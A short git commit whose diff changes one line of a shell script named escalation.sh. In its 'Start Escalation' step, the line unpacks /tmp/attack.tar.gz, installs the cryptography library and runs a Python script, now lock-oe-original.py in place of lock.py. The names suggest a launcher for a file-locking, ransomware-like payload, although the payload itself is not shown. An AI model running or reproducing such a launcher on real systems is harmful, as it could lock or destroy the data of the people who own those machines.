80ec41c649f6ce27fbae85e76ba31250252be838
comet959 <1376723538@qq.com>
2026-01-12 23:26:39 +0800

    update

--- escalation.sh
+++ escalation.sh
@@ -4,4 +4,4 @@ whoami
 echo "========== End ==========="
 
 echo "===== Start Escalation =========="
-cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 ./lock.py
+cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 ./lock-oe-original.py
